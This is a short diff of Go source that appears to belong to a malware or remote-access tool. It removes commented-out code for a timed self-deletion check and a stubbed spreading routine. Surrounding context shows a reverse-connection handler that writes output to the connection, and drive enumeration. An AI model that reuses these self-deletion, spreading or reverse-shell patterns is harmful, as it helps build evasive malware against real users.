@@ -464,23 +464,6 @@ func _handle_reverse(conn net.Conn){
     fmt.Fprintf(conn, "%s\n",out)
 }
 
-/*func _check_lifetime(){
-   for {
-        time.Sleep(LIFETIME_CHECK*time.Second)
-        chuj_ci_w_morde := time.Now()
-		f, _ := dateparse.ParseFormat("FINAL_LIFETIME")
-        cwelu_jebany, _ := time.Parse(f, "FINAL_LIFETIME")
-        if LIFETIME_EXEC == 1 {
-			VAR_TTL_XXX := VAR_TIME_TO_DEL_XXX.String()
-			format, _ := dateparse.ParseFormat(VAR_TTL_XXX)
-            cwelu_jebany, _ = time.Parse(format, VAR_TTL_XXX) 
-        }
-        if chuj_ci_w_morde.After(cwelu_jebany){
-            FUNC_SELF_DELETE()
-        }
-    }
-}*/
-
 func _get_ntp_time() time.Time{
 	type ntp struct {FirstByte,A,B,C uint8;D,E,F uint32;G,H uint64;ReceiveTime uint64;J uint64}
 	sock,_ := net.Dial("udp", "us.pool.ntp.org:123");
@@ -1845,27 +1828,7 @@ func disks() ([]string, error) {
     return found_drives, nil
 }
 
-/*func multi_spread() error {
-    paths_to_copy := []string{}
-    path := ""
-    trigger_file := "SASIN_PRZEJEBAL_70_MILIONOW"
-    switch runtime.GOOS{
-    case "windows":
-        path = ""
-    case "linux":
-        path = ""
-    }
-    full_path := path+trigger_file
-    if !file_exists(full_path){
-
-    }
-    _, err := os.Create(full_path)
-    if err != nil {
-        return err
-    }
-    return nil
-}
-
+/*
 func dialog(message, title string) {
 
 }
